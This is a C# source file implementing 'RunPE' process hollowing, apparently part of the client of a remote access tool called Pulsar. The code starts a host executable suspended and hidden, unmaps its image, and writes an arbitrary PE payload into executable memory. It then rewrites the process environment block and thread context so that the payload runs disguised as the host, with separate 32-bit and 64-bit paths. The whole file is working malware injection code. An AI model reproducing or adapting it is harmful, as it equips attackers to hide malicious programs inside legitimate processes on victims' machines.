using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Pulsar.Client.Helper
{
    //Ai lowkey had to help with the 64 vs 32 bit shit I was lost.
    public static class RunPE
    {
        private const uint CONTEXT_FULL = 0x10001F;
        private const uint CONTEXT_INTEGER = 0x10002;
        
        [DllImport("kernel32.dll")]
        public static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CreateProcessA(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes,
            bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool IsWow64Process(IntPtr hProcess, out bool Wow64Process);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int ZwUnmapViewOfSection(IntPtr hProcess, IntPtr pBaseAddress);

        // For 32-bit compatibility
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int ZwUnmapViewOfSection(IntPtr process, int baseAddress);

        #region Structures
        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
        private struct ProcessInformation
        {
            public IntPtr ProcessHandle;
            public IntPtr ThreadHandle;
            public uint ProcessId;
            public uint ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
        private struct StartupInformation
        {
            public uint Size;
            private readonly string Reserved1;
            private readonly string Desktop;
            private readonly string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x24)] private readonly byte[] Misc;
            private readonly IntPtr Reserved2;
            private readonly IntPtr StdInput;
            private readonly IntPtr StdOutput;
            private readonly IntPtr StdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public uint ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;

            public ulong Rip;

            public XSAVE_FORMAT64 FltSave;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }
        #endregion

        public static bool Execute(string hostPath, byte[] payload)
        {
            ProcessInformation pi = new ProcessInformation();
            
            try
            {
                Debug.WriteLine($"[RunPE] Starting execution with host: {hostPath}");
                Debug.WriteLine($"[RunPE] Payload size: {payload.Length} bytes");
                
                // Validate PE signature
                if (payload.Length < 0x40 || payload[0] != 'M' || payload[1] != 'Z')
                {
                    Debug.WriteLine("[RunPE] Invalid PE file - missing MZ signature");
                    return false;
                }

                StartupInformation si = new StartupInformation();
                si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));

                // CREATE_SUSPENDED | CREATE_NO_WINDOW
                Debug.WriteLine("[RunPE] Creating suspended process...");
                if (!CreateProcessA(hostPath, string.Empty, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, ref pi))
                {
                    int error = Marshal.GetLastWin32Error();
                    Debug.WriteLine($"[RunPE] CreateProcessA failed with error: {error}");
                    return false;
                }

                Debug.WriteLine($"[RunPE] Process created successfully. PID: {pi.ProcessId}");

                try
                {
                    // Determine if target process is WOW64 (32-bit on 64-bit OS)
                    bool isTargetWow64 = false;
                    if (Environment.Is64BitOperatingSystem)
                    {
                        IsWow64Process(pi.ProcessHandle, out isTargetWow64);
                    }
                    Debug.WriteLine($"[RunPE] Target process is {(isTargetWow64 ? "32-bit (WOW64)" : "64-bit")}");

                    // Check payload architecture
                    int fileAddress = BitConverter.ToInt32(payload, 0x3C);
                    ushort machine = BitConverter.ToUInt16(payload, fileAddress + 4);
                    bool isPayload64Bit = (machine == 0x8664);
                    Debug.WriteLine($"[RunPE] Payload architecture: {(isPayload64Bit ? "x64" : "x86")} (Machine: 0x{machine:X})");

                    // Validate architecture compatibility
                    if (isPayload64Bit && isTargetWow64)
                    {
                        Debug.WriteLine("[RunPE] ERROR: Cannot inject 64-bit payload into 32-bit host!");
                        return false;
                    }
                    
                    if (!isPayload64Bit && !isTargetWow64)
                    {
                        Debug.WriteLine("[RunPE] ERROR: Cannot inject 32-bit payload into 64-bit host!");
                        return false;
                    }

                    bool success;
                    if (isTargetWow64)
                    {
                        success = Execute32Bit(pi, payload, fileAddress);
                    }
                    else
                    {
                        success = Execute64Bit(pi, payload, fileAddress);
                    }

                    if (success)
                    {
                        Debug.WriteLine("[RunPE] Resuming thread...");
                        ResumeThread(pi.ThreadHandle);
                        Debug.WriteLine("[RunPE] Execution successful!");
                    }

                    return success;
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"[RunPE] Exception during injection: {ex.Message}");
                    if (pi.ProcessHandle != IntPtr.Zero)
                        TerminateProcess(pi.ProcessHandle, 1);
                    return false;
                }
                finally
                {
                    if (pi.ProcessHandle != IntPtr.Zero)
                        CloseHandle(pi.ProcessHandle);
                    if (pi.ThreadHandle != IntPtr.Zero)
                        CloseHandle(pi.ThreadHandle);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[RunPE] Outer exception: {ex.Message}");
                if (pi.ProcessHandle != IntPtr.Zero)
                {
                    TerminateProcess(pi.ProcessHandle, 1);
                    CloseHandle(pi.ProcessHandle);
                }
                if (pi.ThreadHandle != IntPtr.Zero)
                    CloseHandle(pi.ThreadHandle);
                return false;
            }
        }

        private static bool Execute32Bit(ProcessInformation pi, byte[] payload, int fileAddress)
        {
            Debug.WriteLine("[RunPE] Using 32-bit injection method...");
            
            int[] context = new int[0xB3];
            context[0] = (int)CONTEXT_INTEGER;

            if (!Wow64GetThreadContext(pi.ThreadHandle, context))
            {
                Debug.WriteLine($"[RunPE] Wow64GetThreadContext failed: {Marshal.GetLastWin32Error()}");
                return false;
            }

            int ebx = context[0x29];
            Debug.WriteLine($"[RunPE] EBX: 0x{ebx:X}");

            int readWrite = 0;
            int baseAddress = 0;
            if (!ReadProcessMemory(pi.ProcessHandle, ebx + 0x8, ref baseAddress, 0x4, ref readWrite))
            {
                Debug.WriteLine($"[RunPE] ReadProcessMemory failed: {Marshal.GetLastWin32Error()}");
                return false;
            }

            int imageBase = BitConverter.ToInt32(payload, fileAddress + 0x34);
            Debug.WriteLine($"[RunPE] Original base: 0x{baseAddress:X}, Target base: 0x{imageBase:X}");

            if (imageBase == baseAddress)
            {
                if (ZwUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 0)
                {
                    Debug.WriteLine("[RunPE] ZwUnmapViewOfSection failed");
                    return false;
                }
            }

            int sizeOfImage = BitConverter.ToInt32(payload, fileAddress + 0x50);
            int sizeOfHeaders = BitConverter.ToInt32(payload, fileAddress + 0x54);

            int newImageBase = VirtualAllocEx(pi.ProcessHandle, imageBase, sizeOfImage, 0x3000, 0x40);
            if (newImageBase == 0)
            {
                Debug.WriteLine($"[RunPE] VirtualAllocEx failed: {Marshal.GetLastWin32Error()}");
                return false;
            }

            Debug.WriteLine($"[RunPE] Allocated at: 0x{newImageBase:X}");

            if (!WriteProcessMemory(pi.ProcessHandle, newImageBase, payload, sizeOfHeaders, ref readWrite))
            {
                Debug.WriteLine("[RunPE] Failed to write headers");
                return false;
            }

            short numberOfSections = BitConverter.ToInt16(payload, fileAddress + 0x6);
            int sectionOffset = fileAddress + 0xF8;

            for (int i = 0; i < numberOfSections; i++)
            {
                int virtualAddress = BitConverter.ToInt32(payload, sectionOffset + 0xC);
                int sizeOfRawData = BitConverter.ToInt32(payload, sectionOffset + 0x10);
                int pointerToRawData = BitConverter.ToInt32(payload, sectionOffset + 0x14);

                Debug.WriteLine($"[RunPE] Section {i}: VA=0x{virtualAddress:X}, RawSize=0x{sizeOfRawData:X}, RawPtr=0x{pointerToRawData:X}");

                if (sizeOfRawData > 0 && pointerToRawData > 0)
                {
                    // Bounds check
                    if (pointerToRawData + sizeOfRawData > payload.Length)
                    {
                        Debug.WriteLine($"[RunPE] Warning: Section {i} data exceeds payload bounds, adjusting size");
                        sizeOfRawData = payload.Length - pointerToRawData;
                        if (sizeOfRawData <= 0)
                        {
                            Debug.WriteLine($"[RunPE] Skipping section {i} - invalid data");
                            sectionOffset += 0x28;
                            continue;
                        }
                    }

                    byte[] sectionData = new byte[sizeOfRawData];
                    Buffer.BlockCopy(payload, pointerToRawData, sectionData, 0, sizeOfRawData);

                    if (!WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite))
                    {
                        Debug.WriteLine($"[RunPE] Failed to write section {i}");
                        return false;
                    }
                    Debug.WriteLine($"[RunPE] Section {i} written successfully");
                }
                sectionOffset += 0x28;
            }

            byte[] pointerData = BitConverter.GetBytes(newImageBase);
            if (!WriteProcessMemory(pi.ProcessHandle, ebx + 0x8, pointerData, 0x4, ref readWrite))
            {
                Debug.WriteLine("[RunPE] Failed to update PEB");
                return false;
            }

            int entryPoint = BitConverter.ToInt32(payload, fileAddress + 0x28);
            context[0x2C] = newImageBase + entryPoint;
            Debug.WriteLine($"[RunPE] Entry point: 0x{context[0x2C]:X}");

            if (!Wow64SetThreadContext(pi.ThreadHandle, context))
            {
                Debug.WriteLine($"[RunPE] Wow64SetThreadContext failed: {Marshal.GetLastWin32Error()}");
                return false;
            }

            return true;
        }

        private static bool Execute64Bit(ProcessInformation pi, byte[] payload, int fileAddress)
        {
            Debug.WriteLine("[RunPE] Using 64-bit injection method...");
            
            CONTEXT64 context = new CONTEXT64();
            context.ContextFlags = CONTEXT_FULL;

            if (!GetThreadContext(pi.ThreadHandle, ref context))
            {
                Debug.WriteLine($"[RunPE] GetThreadContext failed: {Marshal.GetLastWin32Error()}");
                return false;
            }

            Debug.WriteLine($"[RunPE] RDX: 0x{context.Rdx:X}");

            byte[] pebBuffer = new byte[8];
            int bytesRead = 0;
            if (!ReadProcessMemory(pi.ProcessHandle, (IntPtr)((long)context.Rdx + 16), pebBuffer, 8, out bytesRead))
            {
                Debug.WriteLine($"[RunPE] ReadProcessMemory failed: {Marshal.GetLastWin32Error()}");
                return false;
            }

            long originalBase = BitConverter.ToInt64(pebBuffer, 0);
            long imageBase = BitConverter.ToInt64(payload, fileAddress + 0x30);
            Debug.WriteLine($"[RunPE] Original base: 0x{originalBase:X}, Target base: 0x{imageBase:X}");

            if (originalBase == imageBase)
            {
                if (ZwUnmapViewOfSection(pi.ProcessHandle, (IntPtr)originalBase) != 0)
                {
                    Debug.WriteLine("[RunPE] ZwUnmapViewOfSection failed");
                    return false;
                }
            }

            int sizeOfImage = BitConverter.ToInt32(payload, fileAddress + 0x50);
            int sizeOfHeaders = BitConverter.ToInt32(payload, fileAddress + 0x54);

            IntPtr newImageBase = VirtualAllocEx(pi.ProcessHandle, (IntPtr)imageBase, (uint)sizeOfImage, 0x3000, 0x40);
            if (newImageBase == IntPtr.Zero)
            {
                Debug.WriteLine($"[RunPE] VirtualAllocEx failed: {Marshal.GetLastWin32Error()}");
                return false;
            }

            Debug.WriteLine($"[RunPE] Allocated at: 0x{newImageBase.ToInt64():X}");

            int bytesWritten = 0;
            if (!WriteProcessMemory(pi.ProcessHandle, newImageBase, payload, sizeOfHeaders, out bytesWritten))
            {
                Debug.WriteLine("[RunPE] Failed to write headers");
                return false;
            }

            short numberOfSections = BitConverter.ToInt16(payload, fileAddress + 0x6);
            // PE32+ has a larger optional header (0x108 vs 0xF8 for PE32)
            int sectionOffset = fileAddress + 0x108;

            for (int i = 0; i < numberOfSections; i++)
            {
                int virtualAddress = BitConverter.ToInt32(payload, sectionOffset + 0xC);
                int sizeOfRawData = BitConverter.ToInt32(payload, sectionOffset + 0x10);
                int pointerToRawData = BitConverter.ToInt32(payload, sectionOffset + 0x14);

                Debug.WriteLine($"[RunPE] Section {i}: VA=0x{virtualAddress:X}, RawSize=0x{sizeOfRawData:X}, RawPtr=0x{pointerToRawData:X}");

                if (sizeOfRawData > 0 && pointerToRawData > 0)
                {
                    // Bounds check
                    if (pointerToRawData + sizeOfRawData > payload.Length)
                    {
                        Debug.WriteLine($"[RunPE] Warning: Section {i} data exceeds payload bounds, adjusting size");
                        sizeOfRawData = payload.Length - pointerToRawData;
                        if (sizeOfRawData <= 0)
                        {
                            Debug.WriteLine($"[RunPE] Skipping section {i} - invalid data");
                            sectionOffset += 0x28;
                            continue;
                        }
                    }

                    byte[] sectionData = new byte[sizeOfRawData];
                    Buffer.BlockCopy(payload, pointerToRawData, sectionData, 0, sizeOfRawData);

                    if (!WriteProcessMemory(pi.ProcessHandle, (IntPtr)((long)newImageBase + virtualAddress), sectionData, sectionData.Length, out bytesWritten))
                    {
                        Debug.WriteLine($"[RunPE] Failed to write section {i}");
                        return false;
                    }
                    Debug.WriteLine($"[RunPE] Section {i} written successfully ({bytesWritten} bytes)");
                }
                sectionOffset += 0x28;
            }

            byte[] newImageBaseBytes = BitConverter.GetBytes((long)newImageBase);
            if (!WriteProcessMemory(pi.ProcessHandle, (IntPtr)((long)context.Rdx + 16), newImageBaseBytes, 8, out bytesWritten))
            {
                Debug.WriteLine("[RunPE] Failed to update PEB");
                return false;
            }

            int entryPoint = BitConverter.ToInt32(payload, fileAddress + 0x28);
            context.Rcx = (ulong)((long)newImageBase + entryPoint);
            Debug.WriteLine($"[RunPE] Entry point: 0x{context.Rcx:X}");

            if (!SetThreadContext(pi.ThreadHandle, ref context))
            {
                Debug.WriteLine($"[RunPE] SetThreadContext failed: {Marshal.GetLastWin32Error()}");
                return false;
            }

            return true;
        }
    }
}
